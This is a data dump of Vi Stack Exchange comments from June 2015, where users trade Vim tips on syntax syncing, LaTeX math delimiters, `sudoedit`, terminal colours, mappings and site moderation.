  <row Id="4936" PostId="3543" Score="0" Text="If you open `$VIMRUNTIME/syntax/tex.vim` and search for `\$`s (heh), you'll see comments like this: «The $..$ and $$..$$ make for impossible sync patterns (one can't tell if a &quot;$$&quot; starts or stops a math zone by itself) The following grouptheres coupled with minlines above help improve the odds of good syncing.» and «4. There is no match-syncing for $...$ and $$...$$; hence large equation blocks constructed that way may exhibit syncing problems (there's no difference between begin/end patterns)». Maybe if you use text objects instead, e.g.: https://github.com/gibiansky/vim-latex-objects" CreationDate="2015-06-08T22:24:25.057" UserId="1800" />
  <row Id="4937" PostId="3543" Score="0" Text="To reuse existing syntax highlighting, but still with text-objects, you also have: https://github.com/kana/vim-textobj-syntax, which defines a `textobj-syntax-i` as &quot;the syntax highlighted item under the cursor&quot;. Then, for example, you can visually select the `$...$` as math object, and if you hit `o`, move cursor to the other end of the visual selection. But still doesn't answer your suggestion of implementing `%` from  syntax highlight rules ... I would like to see a vim guru coming up with some idea." CreationDate="2015-06-08T22:31:03.657" UserId="1800" />
  <row Id="4938" PostId="3544" Score="0" Text="Thanks, Karl, for your explanation. I understand, now, that I won't be adding a couple lines to my .vimrc to implement this functionality. I use vim-latex as my current vim plugin for editing LaTeX files. I'm considering forking vim-latex to improve it. If I do this, I might introduce something like your ``s:highlight_matching_pair`` or LaTeX-Box's ``s:FindMatchingPair``. I see that both plugins require a separate logic branch (if statement) to process if the delimiter being matched is a '$', or not. It's special." CreationDate="2015-06-08T22:34:59.113" UserId="2062" />
  <row Id="4940" PostId="3544" Score="0" Text="Personally I don't recommend forking vim-latex (aka LaTeX-Suite), instead I would suggest you open a pull request [here](https://github.com/vim-latex/vim-latex). Personally I don't like vim-latex, mostly because it is huge and difficult to improve and customize." CreationDate="2015-06-09T06:29:47.867" UserId="21" />
  <row Id="4941" PostId="3543" Score="0" Text="Both vimtex and LaTeX-Box use the syntax group to determine the boundaries of `$...$` as suggested by @Gilles." CreationDate="2015-06-09T06:31:37.840" UserId="21" />
  <row Id="4943" PostId="3552" Score="0" Text="What do you mean with &quot;navigate to the first diff&quot;?" CreationDate="2015-06-09T07:21:08.340" UserId="51" />
  <row Id="4944" PostId="3552" Score="0" Text="I mean jump to the first diff section, like command `]c` does." CreationDate="2015-06-09T07:26:33.887" UserId="477" />
  <row Id="4945" PostId="3543" Score="0" Text="Another reason to use vimtex, then :) Thanks for the info." CreationDate="2015-06-09T08:41:03.823" UserId="1800" />
  <row Id="4946" PostId="3553" Score="0" Text="I've been using `autocmd BufEnter * :syntax sync fromstart` for ages. It's not just Scheme where this will fix problems (IMHO this should be the default)." CreationDate="2015-06-09T09:08:20.077" UserId="51" />
  <row Id="4947" PostId="3553" Score="5" Text="@Carpetsmoker Things are not as clear-cut as you make them seem.  Highlighting for some languages can be _really_ slow, and that might be amplified by the fact that the new regexp engine is still buggy.  Sometimes you can workaround the slowness by setting `re=1` to force the use of the old engine, but sometimes there just isn't any solution.  Running `sync fromstart` in that situation would be a pretty bad idea." CreationDate="2015-06-09T09:33:09.713" UserId="1577" />
  <row Id="4948" PostId="3557" Score="1" Text="Try this:&#xA;`/&lt;ctr-v&gt;u0303` type in normal mode `/` - start search `&lt;Ctr-u&gt;v` - init utf-8 code input `0303` - hexonal code combine character.&#xA;Works fine for me." CreationDate="2015-06-09T15:21:20.330" UserId="1145" />
  <row Id="4949" PostId="3557" Score="1" Text="Works great - thanks!  `:g/&lt;Ctrl-V&gt;u0303` also worked from the command line.  Please add as an answer so I can accept it.  Much appreciated!  (Vim docs at http://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit )" CreationDate="2015-06-09T16:06:12.100" UserId="1430" />
  <row Id="4950" PostId="3554" Score="1" Text="You could put that as an autocommand only when `'diff'` is on, I suppose. That seems harmless enough... `:help vimdiff` gives an example of how (`if &amp;diff`)" CreationDate="2015-06-09T17:21:25.347" UserId="31" />
  <row Id="4951" PostId="3556" Score="0" Text="You could also use `:3,$v/foo/d` for lines that do not match a pattern. `:h vglobal`" CreationDate="2015-06-09T19:32:28.653" UserId="1453" />
  <row Id="4952" PostId="3553" Score="0" Text="If `:syntax sync fromstart` causes too much delay, perhaps I should disable the default feature all together. And find a way to toggle `:syntax sync fromstart`. That way, I can avoid delay and still check for balanced parentheses via a command/shortcut.&#xA;&#xA;Do you know how I can set up a command/shortcut combo to toggle &quot;:syntax sync fromstart&quot;?" CreationDate="2015-06-09T22:03:42.863" UserId="2407" />
  <row Id="4954" PostId="3553" Score="0" Text="Toggling is a little tricky because the type of syntax syncing used for each filetype is set by the filetype's syntax file and varies with the filetype. I think the following will work, though. `map &lt;silent&gt; &lt;F8&gt; :if exists(&quot;g:fromstart&quot;) &lt;bar&gt; syn off &lt;bar&gt; syn on &lt;bar&gt; unlet g:fromstart &lt;bar&gt; else &lt;bar&gt; syn sync fromstart &lt;bar&gt; let g:fromstart=1 &lt;bar&gt; endif &lt;cr&gt;`" CreationDate="2015-06-10T05:02:21.147" UserId="2055" />
  <row Id="4957" PostId="3560" Score="0" Text="I know a lot has changed in Vim since 2006. I was more surprised that nobody has had this question (or at least, asked it in a place that I was able to find within a few minutes of googling) since then..." CreationDate="2015-06-10T16:07:53.920" UserId="1688" />
  <row Id="4959" PostId="3565" Score="7" Text="@SuperScript `S` is a synonym for `cc`" CreationDate="2015-06-11T03:58:56.317" UserId="46" />
  <row Id="4960" PostId="3561" Score="4" Text="On a side note: `sudo vim file` is better written as `sudo -e file` (provided that you set the environment variable `EDITOR=vim`)." CreationDate="2015-06-11T04:31:38.123" UserId="1577" />
  <row Id="4961" PostId="149" Score="0" Text="Why not consider ed for large files?" CreationDate="2015-06-11T06:22:30.560" UserId="2425" />
  <row Id="4963" PostId="3549" Score="0" Text="I was hoping that I could use the keywords I already generated.  Is that possible?&#xA;&#xA;I also don't understand some of the syntax.  What is the `\v` at the start of the match string?  And, what does the escaped-pipe, `\|` mean?" CreationDate="2015-06-11T15:38:03.440" UserId="2399" />
  <row Id="4964" PostId="3568" Score="0" Text="-1 for suggesting plugin addiction recovery (J/K, no downvote really)" CreationDate="2015-06-11T18:57:34.493" UserId="2221" />
  <row Id="4965" PostId="3225" Score="1" Text="@Gilles why don't you put that in an answer?  It's better for Googlers and our site stats." CreationDate="2015-06-11T19:01:44.337" UserId="2221" />
  <row Id="4966" PostId="3225" Score="1" Text="@SuperScript I've researched this a bit more and posted an answer." CreationDate="2015-06-12T00:08:43.723" UserId="8" />
  <row Id="4967" PostId="3568" Score="3" Text="Note that this doesn't run vim as root, like `sudo vim` does.  The editing happens as your normal user and then sudo handles updating the original file." CreationDate="2015-06-12T02:35:35.500" UserId="15" />
  <row Id="4968" PostId="3175" Score="0" Text="This is something I want as well. If you're using ack or ag, performance shouldn't be an issue. Plus if you're using neovim, it should be async, so there shouldn't be any block either." CreationDate="2015-06-12T03:42:36.433" UserId="2442" />
  <row Id="4969" PostId="3175" Score="0" Text="Finally I use ag as ctrlp command :)" CreationDate="2015-06-12T04:51:49.950" UserId="1821" />
  <row Id="4970" PostId="3566" Score="2" Text="This is useful for the `I did a bunch of editing and then realized I should have used sudoedit`, but for the general case I would suggest using `sudo -e`/`sudoedit`." CreationDate="2015-06-12T17:26:42.277" UserId="15" />
  <row Id="4971" PostId="3573" Score="0" Text="I was hoping to avoid a plugin, but if no other answers appear in the next several hours, I'll mark this one as accepted.  Thanks!" CreationDate="2015-06-12T18:35:24.263" UserId="2452" />
  <row Id="4972" PostId="3571" Score="0" Text="This was definitely better than what I had, but while it didn't give me exactly what I wanted (due to not working with my mappings for quote-wrapping), it didn't require much tweaking to make it do what I needed. I changed `'pattern': '\$\w\+\&gt;'` to `'pattern': '\$\?\w\+\&gt;'`, `'select': [ 'av']` to `'select': [ 'aw']`, and altered my mapping from `viw&lt;esc&gt;a&quot;&lt;esc&gt;hbi&quot;&lt;esc&gt;lel` to ``vaw&lt;esc&gt;`&gt;a&quot;&lt;esc&gt;&quot;&lt;i`&lt;esc&gt;f&quot;``. Accepting since it did answer the root question, even if it didn't quite work for my specific case." CreationDate="2015-06-12T18:58:44.347" UserId="1166" />
  <row Id="4973" PostId="3573" Score="0" Text="@Jeff I can understand that you don't want plug-ins but I think that for doing what you want that's the best way to save you a lot of vimscript work. I hope a vim master will provide you a better solution. ;)" CreationDate="2015-06-12T19:50:37.197" UserId="1841" />
  <row Id="4974" PostId="3549" Score="0" Text="@Stephen the `\v` is the [very magic]( http://vim.wikia.com/wiki/Simplifying_regular_expressions_using_magic_and_no-magic) regex switch it makes all characters having a special meaning excepted `[a-zA-Z0-9]` and `_`" CreationDate="2015-06-13T09:54:05.510" UserId="1841" />
  <row Id="4975" PostId="3578" Score="0" Text="Thanks for your suggestion. I edited the above with remarks regarding `xterm-256color`. I followed through with your procedure to find terminal type already set thus." CreationDate="2015-06-13T23:08:25.730" UserId="783" />
  <row Id="4976" PostId="3577" Score="0" Text="Thanks for the idea, Jeff. I edited my question with remarks regarding `xterm-256color`. Setting $TERM via export had no effect." CreationDate="2015-06-13T23:09:42.357" UserId="783" />
  <row Id="4977" PostId="3576" Score="0" Text="Your $TERM is already set to what is generally considered 'correct' on modern systems - 256-color enabled. So the t_Co option, which is normally for compatibility with older terminals, shouldn't be necessary. What if you comment out both configuration lines?" CreationDate="2015-06-14T00:01:58.167" UserId="212" />
  <row Id="4978" PostId="3576" Score="0" Text="@David Commenting out both config lines looks the same as commenting out `set term=xterm`." CreationDate="2015-06-14T02:06:58.527" UserId="783" />
  <row Id="4979" PostId="3583" Score="3" Text="Just to be sure that I understand your question: you regularly type by mistake some sequence like `144477@@` or `99999.` and you want to stop those executions when the number is too big? Am I right? (I have to ask because that seems a little bit weird to me, I never had this problem)" CreationDate="2015-06-14T07:48:07.250" UserId="1841" />
  <row Id="4980" PostId="3583" Score="1" Text="Why not… pay attention on what you do?" CreationDate="2015-06-14T12:20:26.200" UserId="54" />
  <row Id="4981" PostId="3588" Score="1" Text="Thanks that's exactly what I was looking for! I didn't know the `getpos()` and `getline()` commands. Also as you answered the bonus question you deserve a [dancing cookie](http://imgur.com/gallery/j2PQoWh) ;)" CreationDate="2015-06-14T14:57:00.300" UserId="1841" />
  <row Id="4982" PostId="3588" Score="0" Text="A cookie, yay :)" CreationDate="2015-06-14T15:04:17.923" UserId="1800" />
  <row Id="4983" PostId="3583" Score="0" Text="Use persistent undo and increase `undolevels`.  It's a great safety net, and a pretty useful feature by itself." CreationDate="2015-06-14T15:55:30.557" UserId="1577" />
  <row Id="4984" PostId="3588" Score="1" Text="@statox Bookmark this: `:help function-list`.  It's a very useful reference.  Also, +1 for the mention of &quot;Practical Vim&quot;. :)" CreationDate="2015-06-14T16:01:27.293" UserId="1577" />
  <row Id="4985" PostId="3588" Score="0" Text="@lcd047: Wow thanks!! I wish I knew this help entry before, that's so nice to have this list here. Vim documentation is really amazing! Also yay I'm pretty new to vim and &quot;Practical Vim&quot; is my Bible at the moment :)" CreationDate="2015-06-14T16:07:00.060" UserId="1841" />
  <row Id="4986" PostId="3586" Score="0" Text="That's clear:  I've just got vim-common, vim-runtime and vim-tiny under my default installation of kubuntu 14.04.  &quot;There is only one alternative in link group vi (providing /usr/bin/vi): /usr/bin/vim.tiny &quot;  &#xA;Nothing to configure.&#xA;I suppose that means I've got vim.tiny, and that's it out of the three (VI, VIM and EMACS)" CreationDate="2015-06-14T16:49:48.333" UserId="2466" />
  <row Id="4987" PostId="3585" Score="0" Text="FYI: this will require the use of `guifg` and `guibg`. OP's colorscheme uses `ctermfg` and `ctermbg`." CreationDate="2015-06-14T17:42:00.763" UserId="578" />
  <row Id="4988" PostId="3588" Score="0" Text="@Laser also a quickest way to empty the `a` register in normal mode is to record an empty macro with `qaq` maybe it's less elegant than your solution but it works ;) Also your solution can be used in a vimscript whereas I don't think it's possible with mine." CreationDate="2015-06-14T18:18:43.587" UserId="1841" />
  <row Id="4989" PostId="3583" Score="0" Text="@statox yes, that's right. romainl has a valid point too, but it seems irrelevant to the question. The question remains, and it may not be as &quot;serious&quot; as other questions, but a question it is nonetheless. I simply think that it makes sense to be able to specify an upper bound on this to prevent accidental denial-of-service. As for the suggestion about undolevels, yes that can be relevant if this overflows undo buffer as well, I hadn't considered it either. (A not so contrived example -- I have a 60% keyboard, the top border row is numbers. I pick it up with my hand. Forget to unplug it. etc.)" CreationDate="2015-06-14T18:29:59.667" UserId="390" />
  <row Id="4992" PostId="3583" Score="0" Text="@Steven I understand that was a real question, I wasn't  criticizing it I just wanted to be sure I understand. Of course as long at it is on topic and useful for other people your questions is worth being asked and answered. Unfortunately I don't have a good answer and I also think romainl has a good point but I hope you're satisfied with the answer you found or someone will provide you what you're expecting :)" CreationDate="2015-06-14T20:38:31.623" UserId="1841" />
  <row Id="4994" PostId="3596" Score="0" Text="That did it! I don't have enough of a reputation to up vote, but I've marked it as the answer." CreationDate="2015-06-14T23:43:35.340" UserId="2475" />
  <row Id="4995" PostId="3593" Score="1" Text="Welcome to Vi.SX! This answer currently looks like a comment to one of the other answers. You will be able to post comments once your reputation reaches 50. Until then, try to flesh out this answer more so that it can stand on its own." CreationDate="2015-06-15T00:53:48.520" UserId="227" />
  <row Id="4996" PostId="3584" Score="0" Text="thanks a lot for your insights regarding neovim term capability detection and  ` t_*` settings. Removing the redundant copy of and repositioning the `set background=dark` statement didn't have an effect, but those details about the underlying implementation are much more valuable to me." CreationDate="2015-06-15T03:09:31.363" UserId="783" />
  <row Id="4997" PostId="3588" Score="0" Text="On a side note: `getpos('.')[1]` is better (and safer) written as `line('.')`.  Also: _always_ specify either `\m` or `\v` in your regexps that are supposed to go into a script (as opposed to the ones you use with `:` commands), to avoid surprises with `magic`.  See `:help \m`." CreationDate="2015-06-15T04:05:06.780" UserId="1577" />
  <row Id="4998" PostId="3588" Score="0" Text="@lcd047: I agree with you on the magic switches in regex but I have a question on the `line('.')` command: I understand that it's easier to write and to read but how is it safer? Does this command provides some safety net in case of no matched lines or something like that?" CreationDate="2015-06-15T09:36:21.253" UserId="1841" />
  <row Id="4999" PostId="3588" Score="0" Text="If you can somehow convince `getpos()` to return an empty list, then `getpos('.')[1]` will fail.  In this particular case it should never happen.  But it's still a good idea to either avoid indices, or add `try ... catch` safety nets." CreationDate="2015-06-15T09:58:16.390" UserId="1577" />
  <row Id="5000" PostId="3588" Score="0" Text="I agree about `\m` in a script. You won't make me put the flag in the command line though :) It's bad enough as it is, with magic as default vim search mode, that everybody gives solutions on the Internet in this mode (instead of the `very magic`) - just because it's the default one." CreationDate="2015-06-15T10:12:32.450" UserId="1800" />
  <row Id="5001" PostId="3588" Score="0" Text="About using `line('.')` -clearly it is a better solution, even if only because the purpose becomes clearer this way." CreationDate="2015-06-15T10:17:24.823" UserId="1800" />
  <row Id="5002" PostId="3599" Score="2" Text="I don't know if it can restrict to words, but checkout the plugin mentioned in http://vi.stackexchange.com/questions/499/more-detailed-comparison-within-a-line" CreationDate="2015-06-15T10:46:57.063" UserId="205" />
  <row Id="5003" PostId="3586" Score="2" Text="@user12711 indeed. If you want `vim` as you'd expect to find, install `vim`, or if you want the GUI frontend as well, one of `vim-gnome`, `vim-gtk` or `vim-athena`. I'd recommend installing one of the latter three, since they have more features compiled in than the one `vim` has (like X11 clipboard support)." CreationDate="2015-06-15T10:58:42.523" UserId="205" />
  <row Id="5004" PostId="3586" Score="3" Text="pixel, `update-alternatives --display vi` provides a much nicer view, IMHO." CreationDate="2015-06-15T11:00:15.513" UserId="205" />
  <row Id="5005" PostId="3598" Score="0" Text="Using `` is probably a better recommendation than '' since the former goes back to the same line and column.  Ditto for `m vs. 'm." CreationDate="2015-06-15T14:08:04.157" UserId="15" />
  <row Id="5006" PostId="3598" Score="0" Text="I agree. (Any idea how to create literal backtics in wiki markup since they have a special meaning?) - Otherwise your comment will serve well as amendment to my answer and as hint for the readers." CreationDate="2015-06-15T15:58:00.873" UserId="2479" />
  <row Id="5007" PostId="3598" Score="0" Text="You have to use multiple backticks to delimit the inline code (c.f., http://daringfireball.net/projects/markdown/syntax#code).  I know it works in questions/answers, but I couldn't get it to work in my comment." CreationDate="2015-06-15T16:10:13.800" UserId="15" />
  <row Id="5008" PostId="3589" Score="1" Text="&quot;this issue is a hypothetical one&quot;... No, it isn't. I've had to work on SSH on my phone over 2G connections, where I have accidentally missed a keystroke or made multiple keystrokes while typing in anticipation, resulting in very similar situations (maybe not 99999, but smaller numbers yes)." CreationDate="2015-06-15T17:05:05.977" UserId="205" />
  <row Id="5009" PostId="3594" Score="0" Text="Hey, good trick!  That's way useful for Vi and lots of other commands." CreationDate="2015-06-15T17:43:39.227" UserId="2221" />
  <row Id="5010" PostId="3599" Score="0" Text="Huh. Apparently it can. Add `let g:DiffUnit=&quot;Word1&quot;` and it does word-level highlighting." CreationDate="2015-06-15T17:53:39.030" UserId="205" />
  <row Id="5011" PostId="3589" Score="0" Text="Cool, yeah a slow terminal emulator (depending on the amount of changing that vim is applying) can exacerbate problems by adding processing delay on the client side. Gotta get to Ctrl+C quickly!" CreationDate="2015-06-15T23:24:27.393" UserId="390" />
  <row Id="5012" PostId="3600" Score="0" Text="`cd` to the interesting directory inside the script?" CreationDate="2015-06-16T04:38:44.813" UserId="1577" />
  <row Id="5013" PostId="3600" Score="0" Text="yeah sure could do that but I would like to avoid to hard code the location since I will need to execute it on another machine" CreationDate="2015-06-16T04:42:30.757" UserId="436" />
  <row Id="5014" PostId="3601" Score="0" Text="thanks a lo t!  ':cd %:p:h ; bash %:t ; cd -' works as I hoped" CreationDate="2015-06-16T07:56:32.707" UserId="436" />
  <row Id="5015" PostId="3562" Score="0" Text="This can often cause problems in that some vim related files will get written as root in your home directory and later you will encounter errors trying to run your own vim configuration as your own user." CreationDate="2015-06-16T08:04:04.757" UserId="267" />
  <row Id="5016" PostId="3594" Score="3" Text="This has the same side effects that linking your configuration into root's home directory: namely that any vim operations or plugins that write state data will do so in your home directory. These files end up being owned by root and will cause errors later as your normal user will not be able to continue using them." CreationDate="2015-06-16T08:10:37.213" UserId="267" />
  <row Id="5017" PostId="3603" Score="0" Text="Writing a custom command is probably your best bet." CreationDate="2015-06-16T09:53:54.250" UserId="1577" />
  <row Id="5018" PostId="3603" Score="0" Text="`-complete=customlist,MakeComplete` alreeady does what you want?  I don't quite understand where you're stuck or what does't work like you want." CreationDate="2015-06-16T11:08:51.413" UserId="51" />
  <row Id="5019" PostId="3603" Score="0" Text="That only works for a custom command, I'm after something for the built in make command" CreationDate="2015-06-16T11:14:11.590" UserId="584" />
  <row Id="5020" PostId="3605" Score="0" Text="dB and dBs are way better solutions! I still have a while to go with getting comfortable with all of the bindings, so I find myself using a lot of keys do get it done, which is contradictory to using vim I guess..." CreationDate="2015-06-16T14:29:30.587" UserId="2488" />
  <row Id="5021" PostId="3609" Score="0" Text="You are are optimizing keystrokes to save 1 character on the line. Really? - not sure what you mean...i just wanted to remove everything to the beginning and and put it in insert mode, if is more simply put. Sorry for any confusion." CreationDate="2015-06-16T15:54:59.233" UserId="2488" />
  <row Id="5022" PostId="3608" Score="0" Text="Works perfectly! Thanks!" CreationDate="2015-06-16T15:55:08.917" UserId="1111" />
  <row Id="5023" PostId="3609" Score="0" Text="It means, since you want to end up with the cursor on the `e` - it's easier to delete the whole line in one go and write the `e` again. Typing `S` has the threefold advantage of 1. deleting the whole line 2. indenting and 3. leaving you in insert mode to type the `e` again etc." CreationDate="2015-06-16T21:34:34.613" UserId="1800" />
  <row Id="5024" PostId="3609" Score="0" Text="I would have assumed that the OP's data has some context that should not be touched, like in: `pre-context; e.printStackTrace(); post-Context;`. (Otherwise deleting the whole line with `S` would have been the obvious way. But it's very unlikely that in such code there wouldn't even be an indentation to preserve.)" CreationDate="2015-06-17T04:27:45.263" UserId="2479" />
  <row Id="5025" PostId="3612" Score="0" Text="Duplicate of: http://stackoverflow.com/questions/30883563/vim-keeps-unindenting" CreationDate="2015-06-17T07:14:01.980" UserId="1577" />
  <row Id="5026" PostId="3609" Score="0" Text="In this case (which frankly I don't see in the original question), I found the solution proposed above, with `cT.` (which preserves the ';') the best one." CreationDate="2015-06-17T07:49:37.410" UserId="1800" />
  <row Id="5027" PostId="3612" Score="1" Text="Stack Exchange discourages posting the same question on multiple sites. If you decide to post on a different site later, you're expected to delete the original question." CreationDate="2015-06-17T08:57:16.103" UserId="205" />
  <row Id="5028" PostId="3611" Score="0" Text="This is an awesome solution, I still have a lot to learn and get comfortable with ... arrrghh" CreationDate="2015-06-17T09:01:12.093" UserId="2488" />
  <row Id="5029" PostId="3611" Score="0" Text="@user2405469: ahah I think with vim you never stop learning ;) Note that on the same principle than `C` other commands operating on line exists like `D` which deletes the end of the line, `V` which selects all the line, `Y` which yanks all the line etc..." CreationDate="2015-06-17T09:07:05.727" UserId="1841" />
  <row Id="5030" PostId="3615" Score="0" Text="`:help visual-search` simple example for search selected text: `:vmap X y/&lt;C-R&gt;&quot;&lt;CR&gt;&quot; and `gn` - Search forward for the last used search pattern, like with `n`, and start Visual mode to select the match." CreationDate="2015-06-17T09:42:06.360" UserId="1145" />
  <row Id="5031" PostId="3616" Score="0" Text="Indeed you're probably right about the vim way to work... I might be able to find an other way to do what I want. But stricly about my question your solution works for me, thank you." CreationDate="2015-06-17T09:51:27.413" UserId="1841" />
  <row Id="5032" PostId="3615" Score="0" Text="@AlexKroll: I had trouble figuring out what you meant (I think there is a problem in the formatting of your comment) that seems like a nice solution, especially the `gn` part which I didn't know." CreationDate="2015-06-17T09:56:27.990" UserId="1841" />
  <row Id="5033" PostId="3616" Score="0" Text="You're welcome. Bonus: after the 1st `@:`, you can use `@@` (which is easier to type), while you don't use the command-line." CreationDate="2015-06-17T09:59:28.187" UserId="1800" />
  <row Id="5034" PostId="3616" Score="0" Text="Yep I knew this one but I tend to use it for macros and forgot that it can be used in this case. Great bonus anyway!" CreationDate="2015-06-17T10:01:56.933" UserId="1841" />
  <row Id="5035" PostId="3615" Score="0" Text="Yes. I've combined two parts and formatting has broken.&#xA;First part: search pattern selected in visual mode. You can read about it in vimdoc `:help viusual-search`. it's just simple example.&#xA;Second part: navigate forwad to the next matched pattern. Like `n` in normal mode but visual mode have own mapping `gn` for more explanation `:help gn`." CreationDate="2015-06-17T10:01:58.240" UserId="1145" />
  <row Id="5036" PostId="3615" Score="1" Text="That's a nice way to do it! I think that it could also be done with doing a first search and then removing the `&lt;C-R&gt;&quot;` part, this way the search will be done on the last search pattern and the user can yank another piece of text without breaking the mapping.  Also if I may suggest you to edit your comment for the comfort of future users that would be nice ;)" CreationDate="2015-06-17T10:08:32.183" UserId="1841" />
  <row Id="5037" PostId="3612" Score="0" Text="Are you *sure* you want to keep trailing spaces?" CreationDate="2015-06-17T10:30:39.477" UserId="54" />
  <row Id="5038" PostId="3615" Score="0" Text="But your question about selection movement. In other word: select from cursor to third colon in other line. My comment covers case for selection exactly same text in other line." CreationDate="2015-06-17T10:32:07.843" UserId="1145" />
  <row Id="5039" PostId="3612" Score="0" Text="Maybe you want to look into using `set virtualedit=all`? It doesn't do what you're asking for, but it is roughly similar (see the help page)." CreationDate="2015-06-17T11:00:29.373" UserId="51" />
  <row Id="5040" PostId="3617" Score="0" Text="I didn't precise it clearly but I was wondering if there was a built-in solution which would allow not to use macro or mapping, but your 2 first solution works. For the mapping a cool line to add to `vimrc` is `nnoremap &lt;Leader&gt;r :nnoremap &lt;lt&gt;Leader&gt;t ` which allow to quickly redefine the mapping of `&lt;Leader&gt;t`, that could be use to create the quick mapping. For your &quot;experimental solution&quot; I'll have to try it and study it a little bit more because I'm not sure I understand clearly how it works ;)" CreationDate="2015-06-17T11:24:05.413" UserId="1841" />
  <row Id="5041" PostId="3615" Score="0" Text="It's about selecting from cursor to third colon in the same line: `v3f:` will not work if the current line contains less than 3 `:` actually but you're right your comment doesn't covers exactly the same case." CreationDate="2015-06-17T11:27:34.327" UserId="1841" />
  <row Id="5042" PostId="3617" Score="0" Text="Now I understand it better, your last solution is really nice actually! Thanks for sharing that!" CreationDate="2015-06-17T11:41:10.237" UserId="1841" />
  <row Id="5043" PostId="3618" Score="0" Text="I can't reproduce this. With two files, one containing your modeline, `vimdiff -N -u NONE file1 file2` always sets the `'filetype'` correctly. I'm using Vim 7.4.729 on Fedora." CreationDate="2015-06-17T16:21:18.993" UserId="2055" />
  <row Id="5044" PostId="3618" Score="0" Text="I can't reproduce with `vimdiff` either, 7.4.692 on Ubuntu." CreationDate="2015-06-17T16:51:04.300" UserId="205" />
  <row Id="5046" PostId="2004" Score="0" Text="After you figure out your bug, this would be a great time to start keeping your .vimrc under version control :) It's almost always going to be one of the last changes you made to it that made stuff behave strangely." CreationDate="2015-06-17T21:02:24.053" UserId="2503" />
  <row Id="5047" PostId="3619" Score="0" Text="I use `diffchar`, and it didn't cause any problems reading from the modeline. O.o But then again, the plugin does work for me." CreationDate="2015-06-17T21:49:15.793" UserId="205" />
  <row Id="5048" PostId="3623" Score="2" Text="This is fine as long as you never type by mistake the first key in a combination.  And as long as you don't have macros with conflicting prefixes." CreationDate="2015-06-18T05:11:05.983" UserId="1577" />
  <row Id="5049" PostId="3624" Score="2" Text="This is fine as long as you don't edit, say, markdown files, where trailing spaces are significant.  Another failing scenario is when submitting patches for review." CreationDate="2015-06-18T05:13:40.927" UserId="1577" />
  <row Id="5050" PostId="3627" Score="3" Text="Please add a description, what does it do? And could you please change `,` to `&lt;leader&gt;` so it's immediately reuseable?" CreationDate="2015-06-18T07:21:02.033" UserId="237" />
  <row Id="5051" PostId="3627" Score="0" Text="It is already reusable." CreationDate="2015-06-18T07:23:52.987" UserId="54" />
  <row Id="5052" PostId="3628" Score="1" Text="Please, `&lt;leader&gt;` and some short explanation, let's make this useful. Thanks." CreationDate="2015-06-18T07:23:55.197" UserId="237" />
  <row Id="5053" PostId="3620" Score="0" Text="Great call @muru, great call.  Don't ever allow people to share knowledge the way they want to." CreationDate="2015-06-18T08:31:09.110" UserId="1577" />
  <row Id="5054" PostId="3620" Score="4" Text="@lcd047 open a chatroom and share &quot;useful stuff&quot; as much as you need!" CreationDate="2015-06-18T08:33:17.637" UserId="205" />
  <row Id="5055" PostId="3620" Score="0" Text="I would suggest to let it run for a few days first." CreationDate="2015-06-18T08:35:35.613" UserId="237" />
  <row Id="5056" PostId="3620" Score="0" Text="@muru A post lives in principle as long as the site (unless overzealous moderators delete it, that is).  People can come contribute to the list a few years on.  A chatroom is something shared only among people participating to the discussion, and is not discoverable." CreationDate="2015-06-18T08:38:40.497" UserId="1577" />
  <row Id="5057" PostId="3620" Score="3" Text="@lcd047 this sort of big-list questions are not allowed on SE - existing ones already have locks on them. At any rate, if you want to discuss the re-opening of this question, post on [meta]." CreationDate="2015-06-18T08:40:46.573" UserId="205" />
  <row Id="5058" PostId="3628" Score="0" Text="Consider using [unimpaired](https://github.com/tpope/vim-unimpaired) for this, and a lot more." CreationDate="2015-06-18T08:41:24.127" UserId="1577" />
  <row Id="5059" PostId="3620" Score="2" Text="Actually muru isn't wrong: see for example [here](http://stackoverflow.com/questions/182630/jquery-tips-and-tricks), [here](http://stackoverflow.com/questions/15496/hidden-features-of-java) or [here](http://stackoverflow.com/questions/599365/what-is-your-favorite-c-programming-trick). That's not how SO questions are meant to be used (you'll also find a lot of meta thread debating that), a chat room could be a really nice idea because sharing this kind of tricks can be very cool :)" CreationDate="2015-06-18T08:44:02.927" UserId="1841" />
  <row Id="5061" PostId="3620" Score="1" Text="@lcd047 Here: http://meta.vi.stackexchange.com/questions/1278/how-do-we-share-general-vim-experience-or-can-we/1281#1281" CreationDate="2015-06-18T08:52:39.467" UserId="205" />
  <row Id="5062" PostId="3631" Score="0" Text="See `:help complete-functions`." CreationDate="2015-06-18T09:14:08.530" UserId="1577" />
  <row Id="5063" PostId="3628" Score="1" Text="@lcd047, unimpaired is nice for QWERTY users. I use AZERTY and unimpaired is unusable for me." CreationDate="2015-06-18T09:20:53.170" UserId="54" />
  <row Id="5064" PostId="3634" Score="3" Text="Like `:ls` (for listing open buffers)?" CreationDate="2015-06-18T10:21:53.400" UserId="205" />
  <row Id="5065" PostId="3620" Score="3" Text="@Nick Your question says &quot;list your single best trick&quot;, but you've posted 5 answers. They can't all be your best one! ;)" CreationDate="2015-06-18T11:50:15.487" UserId="343" />
  <row Id="5066" PostId="3615" Score="0" Text="What are you actually trying to *do* to the `XX:YY:ZZ foobar:` parts? There might be other ways to achieve your goal that don't involve visual mode. (e.g. `:substitute`, `:global`)" CreationDate="2015-06-18T12:06:09.990" UserId="343" />
  <row Id="5067" PostId="3630" Score="4" Text="I do know what this does, but could you please add some explanation?  Someone who doesn't know vim's mappings very well would have no idea what this does." CreationDate="2015-06-18T12:23:22.403" UserId="865" />
  <row Id="5068" PostId="3633" Score="0" Text="I tried you solution but it doesn't seem to work: When I hit &lt;kbd&gt;Leader&lt;/kbd&gt;+&lt;kbd&gt;UP&lt;/kbd&gt; I have the message `--submode: grow/shrink --` and the window is resized by one line but the command isn't repeated. I tried it with the 4 combinaisons of `g:submode_keep_leaving_key` and `g:submode_timeout` to 0 or 1. I'm not sure if I did something wrong or not. I'm usually using vim in a terminal but for now I can only test with gVim on windows but I'm not sure it change something." CreationDate="2015-06-18T13:13:32.097" UserId="1841" />
  <row Id="5069" PostId="3633" Score="2" Text="The command is not auto-repeated, you still have to hit `Up` or `Down` yourself as many times as needed (but without having to press `Leader` first)" CreationDate="2015-06-18T13:16:40.947" UserId="1800" />
  <row Id="5070" PostId="3615" Score="0" Text="@Rich you're right in this case I finally managed to do what I wanted with a global command. Actually this example wasn't the best to illustrate my purpose, I just remembered I had already faced this case before but couldn't remember precisely the file I was working on. Maybe those other time also I could have done it differently." CreationDate="2015-06-18T13:19:24.010" UserId="1841" />
